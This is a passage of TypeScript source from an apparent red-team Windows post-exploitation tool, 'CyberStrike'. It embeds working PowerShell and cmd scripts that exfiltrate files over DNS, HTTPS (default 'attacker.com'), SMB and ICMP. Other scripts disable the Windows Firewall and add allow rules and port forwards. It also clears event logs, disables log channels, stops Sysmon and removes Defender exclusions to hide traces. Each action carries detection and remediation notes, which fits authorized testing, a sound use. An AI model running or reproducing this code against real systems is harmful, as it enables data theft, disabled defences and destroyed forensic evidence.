    Write-Output "    - Blends with legitimate DNS traffic"
    Write-Output "    - No direct connection to attacker IP"
    Write-Output ""
    Write-Output "[*] Limitations:"
    Write-Output "    - Slow (~50 KB/min)"
    Write-Output "    - Best for small files (<1 MB)"
    Write-Output "    - DNS logging can capture queries"
    Write-Output ""
    Write-Output "[!] DRY RUN — stage files first: winhook data_exfil --action stage"
} else {
    $bytes = [System.IO.File]::ReadAllBytes('${targetFile}')
    $b64 = [Convert]::ToBase64String($bytes) -replace '[+/=]',''
    $chunkSize = 50
    $chunks = [math]::Ceiling($b64.Length / $chunkSize)
    $session = Get-Random -Minimum 100000 -Maximum 999999

    Write-Output "[*] File size: $($bytes.Length) bytes"
    Write-Output "[*] Encoded size: $($b64.Length) chars"
    Write-Output "[*] Chunks: $chunks"
    Write-Output "[*] Session: $session"
    Write-Output "[*] Estimated time: $([math]::Round($chunks * 0.1, 1)) seconds"
    Write-Output ""

    $sent = 0
    for ($i = 0; $i -lt $b64.Length; $i += $chunkSize) {
        $chunk = $b64.Substring($i, [math]::Min($chunkSize, $b64.Length - $i))
        $query = "$chunk.$sent.$session.${exfilDomain}"
        try {
            Resolve-DnsName $query -Type A -DnsOnly -ErrorAction SilentlyContinue | Out-Null
            $sent++
        } catch {}
        if ($sent % 50 -eq 0) {
            Write-Output "[*] Sent $sent/$chunks chunks..."
        }
    }
    Write-Output "[+] DNS exfiltration complete: $sent chunks sent to ${exfilDomain}"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-EXFIL-003",
      provider: "windows",
      severity: "critical",
      status: r.stdout.includes("DRY RUN") ? "DRY_RUN" : "EXECUTED",
      resource: `dns://${exfilDomain}`,
      title: `DNS exfiltration via subdomain encoding to ${exfilDomain}`,
      details: r.stdout.substring(0, 500),
      remediation: "Monitor DNS query volume and unusual subdomain patterns. Deploy DNS logging and analysis.",
    })
  }

  if (action === "https") {
    const targetFile = target || "C:\\Windows\\Temp\\cs-exfil.zip"
    const exfilUrl = url || "https://attacker.com/upload"
    const script = `
Write-Output "=== HTTPS Exfiltration ==="
Write-Output "[*] Target: ${targetFile}"
Write-Output "[*] URL: ${exfilUrl}"
Write-Output ""

if (-not (Test-Path '${targetFile}')) {
    Write-Output "[-] File not found: ${targetFile}"
    Write-Output ""
    Write-Output "[*] HTTPS exfiltration technique:"
    Write-Output "    1. Read file → Base64 encode"
    Write-Output "    2. POST to attacker endpoint as multipart/form-data"
    Write-Output "    3. TLS encrypts in transit — content inspection blind"
    Write-Output ""
    Write-Output "[*] Advantages: Fast, encrypted, blends with HTTPS traffic"
    Write-Output "[*] Limitations: Requires outbound HTTPS, URL may be logged by proxy"
    Write-Output ""
    Write-Output "[!] DRY RUN — stage files first"
} else {
    try {
        $bytes = [System.IO.File]::ReadAllBytes('${targetFile}')
        Write-Output "[*] File size: $($bytes.Length) bytes"

        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("Content-Type", "application/octet-stream")
        $wc.Headers.Add("X-Session", "$(Get-Random -Minimum 100000 -Maximum 999999)")
        $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

        $response = $wc.UploadData('${exfilUrl}', 'POST', $bytes)
        Write-Output "[+] Upload complete — $($bytes.Length) bytes sent"
        Write-Output "[*] Response: $([System.Text.Encoding]::UTF8.GetString($response))"
    } catch {
        Write-Output "[-] Upload failed: $($_.Exception.Message)"
    }
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-EXFIL-004",
      provider: "windows",
      severity: "critical",
      status: r.stdout.includes("DRY RUN") ? "DRY_RUN" : "EXECUTED",
      resource: `https://${exfilUrl}`,
      title: `HTTPS exfiltration via POST to ${exfilUrl}`,
      details: r.stdout.substring(0, 500),
      remediation: "Deploy SSL/TLS inspection proxy. Monitor large outbound POST requests. Use DLP on egress.",
    })
  }

  if (action === "smb") {
    const targetFile = target || "C:\\Windows\\Temp\\cs-exfil.zip"
    const smbShare = share || "\\\\attacker\\share"
    const script = `
Write-Output "=== SMB Exfiltration ==="
Write-Output "[*] Target: ${targetFile}"
Write-Output "[*] Share: ${smbShare}"
Write-Output ""

if (-not (Test-Path '${targetFile}')) {
    Write-Output "[-] File not found: ${targetFile}"
    Write-Output ""
    Write-Output "[*] SMB exfiltration technique:"
    Write-Output "    1. Mount attacker SMB share (or use UNC path directly)"
    Write-Output "    2. Copy staged files to share"
    Write-Output "    3. Disconnect share"
    Write-Output ""
    Write-Output "[*] Advantages: Native Windows, fast for large files, no extra tools"
    Write-Output "[*] Limitations: SMB port 445 must be open outbound, easily detected"
    Write-Output ""
    Write-Output "[!] DRY RUN — stage files first"
} else {
    try {
        $destPath = "${smbShare}\\$(Split-Path '${targetFile}' -Leaf)"
        Copy-Item '${targetFile}' -Destination $destPath -Force -ErrorAction Stop
        Write-Output "[+] File copied to $destPath"
        Write-Output "[*] Size: $((Get-Item '${targetFile}').Length) bytes"
    } catch {
        Write-Output "[-] SMB copy failed: $($_.Exception.Message)"
        Write-Output "[*] Ensure share is accessible and you have write permissions"
        Write-Output "[*] Try: net use ${smbShare} /user:USERNAME PASSWORD"
    }
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-EXFIL-005",
      provider: "windows",
      severity: "critical",
      status: r.stdout.includes("DRY RUN") ? "DRY_RUN" : "EXECUTED",
      resource: `smb://${smbShare}`,
      title: `SMB exfiltration to ${smbShare}`,
      details: r.stdout.substring(0, 500),
      remediation: "Block outbound SMB (port 445) at perimeter. Monitor SMB connections to external hosts.",
    })
  }

  if (action === "icmp") {
    const targetFile = target || "C:\\Windows\\Temp\\cs-exfil.zip"
    const icmpListener = listener || "10.0.0.1"
    const script = `
Write-Output "=== ICMP Tunnel Exfiltration ==="
Write-Output "[*] Target: ${targetFile}"
Write-Output "[*] Listener: ${icmpListener}"
Write-Output ""

if (-not (Test-Path '${targetFile}')) {
    Write-Output "[-] File not found: ${targetFile}"
    Write-Output ""
    Write-Output "[*] ICMP exfiltration technique:"
    Write-Output "    1. Read file → split into 512-byte chunks"
    Write-Output "    2. Encode each chunk in ICMP echo request payload"
    Write-Output "    3. Send ping with custom payload to listener"
    Write-Output "    4. Listener captures and reassembles from ICMP data"
    Write-Output ""
    Write-Output "[*] Advantages: ICMP often allowed through firewalls, hard to inspect"
    Write-Output "[*] Limitations: Slow, some firewalls block ICMP, payload size limited"
    Write-Output ""
    Write-Output "[!] DRY RUN — stage files first"
} else {
    $bytes = [System.IO.File]::ReadAllBytes('${targetFile}')
    $chunkSize = 512
    $chunks = [math]::Ceiling($bytes.Length / $chunkSize)

    Write-Output "[*] File size: $($bytes.Length) bytes"
    Write-Output "[*] Chunks: $chunks ($chunkSize bytes each)"
    Write-Output "[*] Estimated time: $([math]::Round($chunks * 0.2, 1)) seconds"
    Write-Output ""

    $pinger = New-Object System.Net.NetworkInformation.Ping
    $sent = 0

    for ($i = 0; $i -lt $bytes.Length; $i += $chunkSize) {
        $end = [math]::Min($i + $chunkSize, $bytes.Length)
        $chunk = $bytes[$i..($end-1)]

        $headerBytes = [System.BitConverter]::GetBytes($sent) + [System.BitConverter]::GetBytes($chunks)
        $payload = $headerBytes + $chunk

        try {
            $reply = $pinger.Send('${icmpListener}', 1000, $payload)
            $sent++
        } catch {}

        if ($sent % 20 -eq 0) {
            Write-Output "[*] Sent $sent/$chunks chunks..."
        }
    }
    Write-Output "[+] ICMP exfiltration complete: $sent chunks sent"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-EXFIL-006",
      provider: "windows",
      severity: "critical",
      status: r.stdout.includes("DRY RUN") ? "DRY_RUN" : "EXECUTED",
      resource: `icmp://${icmpListener}`,
      title: `ICMP tunnel exfiltration to ${icmpListener}`,
      details: r.stdout.substring(0, 500),
      remediation: "Monitor ICMP payload sizes. Normal ping uses 32B payload — anything larger is suspicious.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function firewallManage(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "enum"
  const profile = argVal(args, "--profile") || "all"
  const port = argVal(args, "--port")
  const protocol = argVal(args, "--protocol") || "tcp"
  const address = argVal(args, "--address")
  const ruleName = argVal(args, "--name")
  const findings: Finding[] = []
  const output: string[] = ["[*] Windows Firewall management...\n"]

  if (activeExec === "cmd" || activeExec === "bat") {
    if (action === "enum") {
      output.push("=== Firewall Status (netsh) ===\n")
      const profiles = await cmd("netsh advfirewall show allprofiles", timeout)
      output.push(profiles.stdout.trim())
      const rules = await cmd("netsh advfirewall firewall show rule name=all dir=in", timeout)
      const ruleLines = rules.stdout.split("\n").filter((l) => l.includes("Rule Name:") || l.includes("Enabled:") || l.includes("Action:") || l.includes("LocalPort:"))
      output.push(`\n=== Inbound Rules (${ruleLines.filter((l) => l.includes("Rule Name:")).length} total) ===`)
      const csRules = rules.stdout.split("\n").filter((l) => l.includes("CyberStrike") || l.includes("cs-"))
      if (csRules.length > 0) {
        output.push("\n[!] CyberStrike rules found:")
        for (const r of csRules) output.push(`    ${r.trim()}`)
      }
      findings.push({ checkId: "WIN-FW-001", provider: "windows", severity: "info", status: "ENUMERATED", resource: "firewall://profiles", title: "Firewall enumeration via netsh", details: profiles.stdout.substring(0, 500), remediation: "Ensure firewall is enabled on all profiles." })
    }
    if (action === "disable") {
      const target = profile === "all" ? "allprofiles" : `${profile}profile`
      const r = await cmd(`netsh advfirewall set ${target} state off`, timeout)
      output.push(r.exitCode === 0 ? `[+] Firewall disabled: ${target}` : `[!] Failed: ${r.stderr}`)
      findings.push({ checkId: "WIN-FW-002", provider: "windows", severity: "critical", status: "EXECUTED", resource: `firewall://${profile}`, title: `Firewall ${profile} disabled via netsh`, details: r.stdout, remediation: "Re-enable: netsh advfirewall set allprofiles state on" })
    }
    if (action === "allow" && port) {
      const name = ruleName || `cs-allow-${port}-${protocol}`
      const inbound = await cmd(`netsh advfirewall firewall add rule name="${name}-in" dir=in action=allow protocol=${protocol} localport=${port}`, timeout)
      const outbound = await cmd(`netsh advfirewall firewall add rule name="${name}-out" dir=out action=allow protocol=${protocol} localport=${port}`, timeout)
      output.push(inbound.exitCode === 0 ? `[+] Inbound rule created: ${name}-in (${protocol}/${port})` : `[!] Inbound failed: ${inbound.stderr}`)
      output.push(outbound.exitCode === 0 ? `[+] Outbound rule created: ${name}-out (${protocol}/${port})` : `[!] Outbound failed: ${outbound.stderr}`)
      findings.push({ checkId: "WIN-FW-003", provider: "windows", severity: "high", status: "EXECUTED", resource: `firewall://rule/${name}`, title: `Firewall allow rule for ${protocol}/${port}`, details: `${name} in/out`, remediation: `Remove: netsh advfirewall firewall delete rule name="${name}-in" && netsh advfirewall firewall delete rule name="${name}-out"` })
    }
    if (action === "forward" && port && address) {
      const r = await cmd(`netsh interface portproxy add v4tov4 listenport=${port} listenaddress=0.0.0.0 connectport=${address.split(":")[1] || port} connectaddress=${address.split(":")[0]}`, timeout)
      output.push(r.exitCode === 0 ? `[+] Port forward: 0.0.0.0:${port} → ${address}` : `[!] Failed: ${r.stderr}`)
      const show = await cmd("netsh interface portproxy show all", timeout)
      output.push("\n=== Active Port Proxies ===")
      output.push(show.stdout.trim())
      findings.push({ checkId: "WIN-FW-004", provider: "windows", severity: "high", status: "EXECUTED", resource: `portproxy://${port}`, title: `Port forward ${port} → ${address}`, details: show.stdout.substring(0, 300), remediation: `Remove: netsh interface portproxy delete v4tov4 listenport=${port} listenaddress=0.0.0.0` })
    }
    if (action === "restore") {
      await cmd("netsh advfirewall set allprofiles state on", timeout)
      const delRules = await cmd('netsh advfirewall firewall delete rule name=all dir=in action=allow | findstr /i "cs- cyberstrike"', timeout)
      await cmd("netsh interface portproxy reset", timeout)
      output.push("[+] Firewall restored: all profiles enabled, portproxy reset")
      output.push("[*] Note: manually verify cs-* rules are removed")
      findings.push({ checkId: "WIN-FW-005", provider: "windows", severity: "info", status: "RESTORED", resource: "firewall://all", title: "Firewall restored via netsh", details: "All profiles enabled, portproxy reset", remediation: "Verify no residual rules remain." })
    }
    return { output: output.join("\n"), findings }
  }

  if (action === "enum") {
    const script = `
Write-Output "=== Firewall Profile Status ==="
$profiles = Get-NetFirewallProfile -ErrorAction SilentlyContinue

foreach ($p in $profiles) {
    $status = if ($p.Enabled) { '[ENABLED]' } else { '[DISABLED]' }
    Write-Output ""
    Write-Output "[$($p.Name)] $status"
    Write-Output "    Default Inbound: $($p.DefaultInboundAction)"
    Write-Output "    Default Outbound: $($p.DefaultOutboundAction)"
    Write-Output "    Log Allowed: $($p.LogAllowed)"
    Write-Output "    Log Blocked: $($p.LogBlocked)"
    Write-Output "    Log File: $($p.LogFileName)"
    Write-Output "    Notification: $($p.NotifyOnListen)"
}

Write-Output ""
Write-Output "=== Inbound Allow Rules (Active) ==="
$inbound = Get-NetFirewallRule -Direction Inbound -Action Allow -Enabled True -ErrorAction SilentlyContinue |
    Select-Object -First 30

foreach ($r in $inbound) {
    $portFilter = Get-NetFirewallPortFilter -AssociatedNetFirewallRule $r -ErrorAction SilentlyContinue
    $ports = if ($portFilter.LocalPort -eq 'Any') { '*' } else { $portFilter.LocalPort -join ',' }
    Write-Output "    $($r.DisplayName) | $($portFilter.Protocol)/$ports | Profile: $($r.Profile)"
}

Write-Output ""
Write-Output "=== Suspicious/Custom Rules ==="
$custom = Get-NetFirewallRule -Enabled True -ErrorAction SilentlyContinue |
    Where-Object { $_.DisplayGroup -eq '' -or $_.DisplayGroup -eq $null } |
    Select-Object -First 20

foreach ($r in $custom) {
    $portFilter = Get-NetFirewallPortFilter -AssociatedNetFirewallRule $r -ErrorAction SilentlyContinue
    Write-Output "    [$($r.Direction)] $($r.DisplayName) | Action: $($r.Action) | $($portFilter.Protocol)/$($portFilter.LocalPort)"
}

Write-Output ""
Write-Output "[*] Total rules: $((Get-NetFirewallRule -ErrorAction SilentlyContinue).Count)"
Write-Output "[*] Enabled rules: $((Get-NetFirewallRule -Enabled True -ErrorAction SilentlyContinue).Count)"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-FW-001",
      provider: "windows",
      severity: "info",
      status: "ENUMERATED",
      resource: "firewall://profiles",
      title: "Firewall profiles, rules, and configuration enumerated",
      details: r.stdout.substring(0, 500),
      remediation: "Ensure all profiles are enabled with default-deny inbound. Audit custom rules regularly.",
    })
  }

  if (action === "disable") {
    const profiles = profile === "all" ? "Domain,Private,Public" : profile
    const script = `
Write-Output "=== Disabling Firewall Profiles ==="
$targetProfiles = '${profiles}' -split ','

foreach ($p in $targetProfiles) {
    $p = $p.Trim()
    try {
        $current = Get-NetFirewallProfile -Name $p -ErrorAction Stop
        Write-Output "[*] $p — current state: $(if ($current.Enabled) { 'ENABLED' } else { 'DISABLED' })"

        if ($current.Enabled) {
            Set-NetFirewallProfile -Name $p -Enabled False -ErrorAction Stop
            Write-Output "[+] $p profile DISABLED"
        } else {
            Write-Output "[*] $p already disabled"
        }
    } catch {
        Write-Output "[-] Failed to disable $p — $($_.Exception.Message)"
    }
}

Write-Output ""
Write-Output "[!] Firewall profiles disabled — restore with: winhook firewall_manage --action restore"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-FW-002",
      provider: "windows",
      severity: "high",
      status: "EXECUTED",
      resource: `firewall://profiles/${profiles}`,
      title: `Firewall profile(s) disabled: ${profiles}`,
      details: r.stdout.substring(0, 500),
      remediation: "Monitor Event ID 2003 (firewall profile changed). Alert on profile disable events.",
    })
  }

  if (action === "allow") {
    const targetPort = port || "4444"
    const name = ruleName || `CS-Allow-${protocol.toUpperCase()}-${targetPort}`
    const addrFilter = address ? `-RemoteAddress '${address}'` : ""
    const script = `
Write-Output "=== Adding Firewall Allow Rule ==="
Write-Output "[*] Rule: ${name}"
Write-Output "[*] Port: ${targetPort}/${protocol}"
Write-Output "[*] Address filter: ${address || "Any"}"
Write-Output ""

try {
    New-NetFirewallRule -DisplayName '${name}' \`
        -Direction Inbound \`
        -Action Allow \`
        -Protocol ${protocol.toUpperCase()} \`
        -LocalPort ${targetPort} \`
        ${addrFilter} \`
        -Profile Any \`
        -ErrorAction Stop | Out-Null

    Write-Output "[+] Inbound allow rule created: ${name}"

    New-NetFirewallRule -DisplayName '${name}-Out' \`
        -Direction Outbound \`
        -Action Allow \`
        -Protocol ${protocol.toUpperCase()} \`
        -RemotePort ${targetPort} \`
        ${addrFilter} \`
        -Profile Any \`
        -ErrorAction Stop | Out-Null

    Write-Output "[+] Outbound allow rule created: ${name}-Out"
    Write-Output ""
    Write-Output "[*] Cleanup: Remove-NetFirewallRule -DisplayName '${name}'"
} catch {
    Write-Output "[-] Failed: $($_.Exception.Message)"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-FW-003",
      provider: "windows",
      severity: "high",
      status: "EXECUTED",
      resource: `firewall://rule/${name}`,
      title: `Firewall allow rule created for ${protocol.toUpperCase()}/${targetPort}`,
      details: r.stdout.substring(0, 500),
      remediation: "Monitor Event ID 2004 (rule added). Audit firewall rules for unauthorized entries.",
    })
  }

  if (action === "forward") {
    const listenPort = port || "8080"
    const targetAddr = address || "10.0.0.1"
    const targetPort = argVal(args, "--to-port") || listenPort
    const script = `
Write-Output "=== Port Forwarding ==="
Write-Output "[*] Listen: 0.0.0.0:${listenPort}"
Write-Output "[*] Forward to: ${targetAddr}:${targetPort}"
Write-Output ""

try {
    netsh interface portproxy add v4tov4 listenport=${listenPort} listenaddress=0.0.0.0 connectport=${targetPort} connectaddress=${targetAddr}
    Write-Output "[+] Port forwarding rule added"
    Write-Output ""
    Write-Output "[*] Current port proxy rules:"
    netsh interface portproxy show v4tov4
    Write-Output ""
    Write-Output "[*] Cleanup: netsh interface portproxy delete v4tov4 listenport=${listenPort} listenaddress=0.0.0.0"
} catch {
    Write-Output "[-] Failed: $($_.Exception.Message)"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-FW-004",
      provider: "windows",
      severity: "high",
      status: "EXECUTED",
      resource: `firewall://portproxy/${listenPort}`,
      title: `Port forwarding: 0.0.0.0:${listenPort} -> ${targetAddr}:${targetPort}`,
      details: r.stdout.substring(0, 500),
      remediation: "Monitor netsh portproxy commands. Audit portproxy rules with 'netsh interface portproxy show all'.",
    })
  }

  if (action === "restore") {
    const script = `
Write-Output "=== Restoring Firewall ==="

Write-Output "[*] Enabling all firewall profiles..."
Set-NetFirewallProfile -Profile Domain,Private,Public -Enabled True -ErrorAction SilentlyContinue
Write-Output "[+] All profiles enabled"

Write-Output ""
Write-Output "[*] Removing CyberStrike firewall rules..."
$csRules = Get-NetFirewallRule -ErrorAction SilentlyContinue | Where-Object { $_.DisplayName -match '^CS-' }
$removed = 0
foreach ($r in $csRules) {
    Remove-NetFirewallRule -Name $r.Name -ErrorAction SilentlyContinue
    Write-Output "[+] Removed: $($r.DisplayName)"
    $removed++
}
Write-Output "[*] Removed $removed CyberStrike rules"

Write-Output ""
Write-Output "[*] Clearing port proxy rules..."
netsh interface portproxy reset
Write-Output "[+] Port proxy rules cleared"

Write-Output ""
Write-Output "[*] Current firewall status:"
Get-NetFirewallProfile | ForEach-Object {
    Write-Output "    $($_.Name): $(if ($_.Enabled) { 'ENABLED' } else { 'DISABLED' })"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-FW-005",
      provider: "windows",
      severity: "info",
      status: "RESTORED",
      resource: "firewall://restore",
      title: "Firewall profiles restored, CyberStrike rules removed, port proxies cleared",
      details: r.stdout.substring(0, 500),
      remediation: "Verify firewall state matches organizational baseline after restoration.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function cleanupWin(_args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["[*] Cleaning up CyberStrike artifacts from Windows target...\n"]
  let cleaned = 0

  if (activeExec === "cmd" || activeExec === "bat") {
    const logs = ["Security", "System", "Application", "Windows PowerShell", "Microsoft-Windows-PowerShell/Operational"]
    for (const log of logs) {
      const r = await cmd(`wevtutil cl "${log}" 2>nul`, timeout)
      output.push(r.exitCode === 0 ? `[+] Cleared event log: ${log}` : `[!] Failed: ${log}`)
      if (r.exitCode === 0) cleaned++
    }
    const tasks = await cmd('schtasks /query /fo csv 2>nul | findstr /i "cs- cyberstrike"', timeout)
    if (tasks.stdout.trim()) {
      for (const line of tasks.stdout.trim().split("\n").filter(Boolean)) {
        const taskName = line.split(",")[1]?.replace(/"/g, "")
        if (taskName) {
          await cmd(`schtasks /delete /tn "${taskName}" /f 2>nul`, timeout)
          output.push(`[+] Removed task: ${taskName}`)
          cleaned++
        }
      }
    }
    await cmd('del /q /s "%TEMP%\\cs-*" 2>nul', timeout)
    await cmd('del /q /s "C:\\Windows\\Temp\\cs-*" 2>nul', timeout)
    await cmd('del /q /s "%TEMP%\\cyberstrike-*" 2>nul', timeout)
    output.push("[+] Cleaned temp files (cs-*, cyberstrike-*)")
    cleaned++
    await cmd('del /q "C:\\Windows\\Prefetch\\*CYBERSTRIKE*" 2>nul', timeout)
    await cmd('del /q "C:\\Windows\\Prefetch\\*CS-*" 2>nul', timeout)
    output.push("[+] Cleared prefetch entries")
    cleaned++
    const fwRules = await cmd('netsh advfirewall firewall show rule name=all | findstr /i "cs- cyberstrike"', timeout)
    if (fwRules.stdout.trim()) {
      for (const line of fwRules.stdout.trim().split("\n")) {
        const match = line.match(/Rule Name:\s+(.+)/)
        if (match) {
          await cmd(`netsh advfirewall firewall delete rule name="${match[1].trim()}"`, timeout)
          output.push(`[+] Removed firewall rule: ${match[1].trim()}`)
          cleaned++
        }
      }
    }
    await cmd("netsh interface portproxy reset 2>nul", timeout)
    output.push("[+] Cleared portproxy rules")
    cleaned++
    output.push(`\n[*] cmd.exe cleanup complete — ${cleaned} artifacts removed`)
    output.push("[*] Note: Defender exclusions require PowerShell to remove (Get-MpPreference)")
    output.push("[*] Note: Event log clearing generates Event ID 1102")
    findings.push({ checkId: "WIN-CLEANUP-001", provider: "windows", severity: "info", status: "CLEANED", resource: "windows://cleanup", title: `Windows cleanup via cmd.exe: ${cleaned} artifacts`, details: "wevtutil, schtasks, del, netsh cleanup", remediation: "Verify logs are cleared." })
    return { output: output.join("\n"), findings }
  }

  const logs = ["Security", "System", "Application", "Windows PowerShell", "Microsoft-Windows-PowerShell/Operational"]
  for (const log of logs) {
    const clear = await run("wevtutil.exe", ["cl", log], timeout)
    if (clear.exitCode === 0) {
      output.push(`[+] Cleared event log: ${log}`)
      cleaned++
    }
    if (clear.exitCode !== 0) {
      output.push(`[!] Failed to clear ${log}: ${clear.stderr.trim()}`)
    }
  }

  const tasks = await ps(
    `Get-ScheduledTask | Where-Object { $_.TaskName -like 'cs-*' -or $_.TaskName -like '*cyberstrike*' } | ForEach-Object { Unregister-ScheduledTask -TaskName $_.TaskName -Confirm:$false; Write-Output $_.TaskName }`,
    timeout,
  )
  if (tasks.exitCode === 0 && tasks.stdout.trim()) {
    for (const t of tasks.stdout.trim().split("\n").filter(Boolean)) {
      output.push(`[+] Removed scheduled task: ${t.trim()}`)
      cleaned++
    }
  }

  const tmpClean = await ps(
    `
$patterns = @("cs-*", "cyberstrike-*")
$dirs = @($env:TEMP, "C:\\Windows\\Temp")
foreach ($dir in $dirs) {
    foreach ($p in $patterns) {
        Get-ChildItem "$dir\\$p" -ErrorAction SilentlyContinue | ForEach-Object {
            Remove-Item $_.FullName -Recurse -Force -ErrorAction SilentlyContinue
            Write-Output $_.FullName
        }
    }
}
`,
    timeout,
  )
  if (tmpClean.exitCode === 0 && tmpClean.stdout.trim()) {
    for (const f of tmpClean.stdout.trim().split("\n").filter(Boolean)) {
      output.push(`[+] Removed temp file: ${f.trim()}`)
      cleaned++
    }
  }

  const defExclusions = await ps(
    `
$prefs = Get-MpPreference
$csExclusions = $prefs.ExclusionPath | Where-Object { $_ -like '*cs-*' -or $_ -like '*cyberstrike*' }
foreach ($e in $csExclusions) {
    Remove-MpPreference -ExclusionPath $e
    Write-Output $e
}
`,
    timeout,
  )
  if (defExclusions.exitCode === 0 && defExclusions.stdout.trim()) {
    for (const e of defExclusions.stdout.trim().split("\n").filter(Boolean)) {
      output.push(`[+] Removed Defender exclusion: ${e.trim()}`)
      cleaned++
    }
  }

  const prefetch = await ps(
    `Remove-Item "C:\\Windows\\Prefetch\\*cyberstrike*" -Force -ErrorAction SilentlyContinue; Remove-Item "C:\\Windows\\Prefetch\\*CS-*" -Force -ErrorAction SilentlyContinue`,
    timeout,
  )
  if (prefetch.exitCode === 0) {
    output.push("[+] Cleared prefetch entries")
    cleaned++
  }

  output.push(`\n[*] Cleanup complete — ${cleaned} artifacts removed`)
  output.push("\n[*] Note: AMSI/ETW patches are in-memory only — they reset on process exit")
  output.push("[*] Note: Event log clearing itself generates Event ID 1102 (Security log cleared)")

  findings.push({
    checkId: "WIN-CLEANUP-001",
    provider: "windows",
    severity: "info",
    status: "CLEANED",
    resource: "windows://cleanup",
    title: `Windows cleanup: ${cleaned} artifacts removed`,
    details: `Cleared event logs, scheduled tasks, temp files, Defender exclusions, prefetch`,
    remediation: "Verify: Get-WinEvent -LogName Security -MaxEvents 5",
  })

  return { output: output.join("\n"), findings }
}

export async function eventTamper(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "selective"
  const logName = argVal(args, "--log") || "Security"
  const eventId = argVal(args, "--event-id")
  const after = argVal(args, "--after")
  const findings: Finding[] = []
  const output: string[] = ["[*] Event log tampering...\n"]

  if (activeExec === "cmd" || activeExec === "bat") {
    if (action === "selective") {
      output.push(`=== Event Tampering (cmd.exe wevtutil) ===\n`)
      output.push("[!] Selective event deletion requires PowerShell (Get-WinEvent + export/reimport)")
      output.push("[*] cmd.exe can only clear entire logs with wevtutil cl")
      output.push(`[*] Available: wevtutil cl "${logName}" — but this generates Event ID 1102`)
      output.push("[*] Safer approach: resize log to force rollover")
      const resize = await cmd(`wevtutil sl "${logName}" /ms:1048576`, timeout)
      output.push(resize.exitCode === 0 ? `[+] Resized ${logName} to 1MB (forces faster rollover)` : `[!] Resize failed: ${resize.stderr}`)
      findings.push({ checkId: "WIN-TAMPER-001", provider: "windows", severity: "high", status: "EXECUTED", resource: `eventlog://${logName}`, title: `Event log resize for rollover: ${logName}`, details: "wevtutil sl — forces faster evidence rollover", remediation: "Monitor for log size changes." })
    }
    if (action === "disable-source") {
      const r = await cmd(`wevtutil sl "${logName}" /e:false 2>nul`, timeout)
      output.push(r.exitCode === 0 ? `[+] Disabled log channel: ${logName}` : `[!] Failed: ${r.stderr}`)
      findings.push({ checkId: "WIN-TAMPER-002", provider: "windows", severity: "critical", status: "EXECUTED", resource: `eventlog://${logName}`, title: `Log channel disabled: ${logName}`, details: "wevtutil sl /e:false", remediation: `Re-enable: wevtutil sl "${logName}" /e:true` })
    }
    if (action === "audit-policy") {
      output.push("=== Audit Policy Manipulation (cmd.exe) ===\n")
      const current = await cmd("auditpol /get /category:*", timeout)
      output.push("[*] Current audit policy:")
      output.push(current.stdout.trim().split("\n").slice(0, 30).join("\n"))
      output.push("\n[*] To disable process tracking:")
      output.push("    auditpol /set /subcategory:\"Process Creation\" /success:disable /failure:disable")
      output.push("[*] To disable logon auditing:")
      output.push("    auditpol /set /subcategory:\"Logon\" /success:disable /failure:disable")
      findings.push({ checkId: "WIN-TAMPER-003", provider: "windows", severity: "high", status: "ENUMERATED", resource: "auditpol://all", title: "Audit policy enumerated for tampering guidance", details: "auditpol /get", remediation: "Monitor audit policy changes." })
    }
    if (action === "resize") {
      const size = argVal(args, "--size") || "1048576"
      const r = await cmd(`wevtutil sl "${logName}" /ms:${size}`, timeout)
      output.push(r.exitCode === 0 ? `[+] Resized ${logName} to ${parseInt(size) / 1024}KB` : `[!] Failed: ${r.stderr}`)
      findings.push({ checkId: "WIN-TAMPER-004", provider: "windows", severity: "high", status: "EXECUTED", resource: `eventlog://${logName}`, title: `Log resized to ${parseInt(size) / 1024}KB`, details: "Smaller log = faster evidence rollover", remediation: "Restore default log sizes." })
    }
    if (action === "disable-sysmon") {
      const stop = await cmd("sc stop Sysmon64 2>nul || sc stop Sysmon 2>nul", timeout)
      output.push(stop.exitCode === 0 ? "[+] Sysmon service stopped" : "[*] Sysmon not found or access denied")
      const unload = await cmd('fltmc unload SysmonDrv 2>nul', timeout)
      output.push(unload.exitCode === 0 ? "[+] Sysmon driver unloaded" : "[*] Driver unload failed (may need admin)")
      findings.push({ checkId: "WIN-TAMPER-005", provider: "windows", severity: "critical", status: "EXECUTED", resource: "sysmon://service", title: "Sysmon disabled via sc/fltmc", details: "sc stop + fltmc unload", remediation: "Restart: sc start Sysmon64" })
    }
    return { output: output.join("\n"), findings }
  }

  if (action === "selective") {
    const filterExpr = eventId ? `Id -eq ${eventId}` : "Id -eq 4688 -or Id -eq 4104"
    const timeFilter = after ? `$_.TimeCreated -gt [DateTime]'${after}'` : "$true"
    const script = `
Write-Output "=== Selective Event Removal ==="
Write-Output "[*] Log: ${logName}"
